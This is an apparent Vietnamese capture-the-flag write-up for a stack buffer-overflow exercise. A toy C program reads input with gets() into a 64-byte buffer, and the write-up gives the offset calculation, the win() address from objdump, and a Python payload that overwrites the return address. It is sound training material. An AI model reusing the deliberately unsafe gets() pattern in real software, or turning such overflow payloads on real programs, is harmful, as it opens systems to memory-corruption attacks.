# Preview
Source code:
```shell
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);         <--- vuln
}
```
Tổng quan:
- Lỗ hổng nằm ở hàm gets(buffer)
- Ý tưởng: Thay đổi giá trị Return address để quay trở về hàm win
# Exploit

**Tính toán offset**
Như các bài stack trên thì biến buffer có thể ghi đè hơn 64 bytes. Chúng ta cần tìm vị trí chính xác của eip để điều hướng tới hàm win().
```shell
    0x080491ac <+11>:    mov    ebp,esp
    0x080491ae <+13>:    push   ebx
    0x080491af <+14>:    push   ecx
    0x080491b0 <+15>:    sub    esp,0x40        <--- kích thước stack = 64
```

Ghi đè ebp = 64 bytes buffer[] + 8 bytes ebx, ecx + 4 bytes ebp

**Tìm địa chỉ hàm win**
```shell
└─$ objdump -d vuln | grep win
08049176 <win>:
```

**Payload**
```shell

buffer = "a" * 64  + "a" * 8 #ebx + ecx
ebp = "\x77" * 4    # ghi đè ebp
eip = "\x76\x91\x04\x08"        # địa chỉ hàm win

payload = buffer + ebp + eip
print(payload)
```



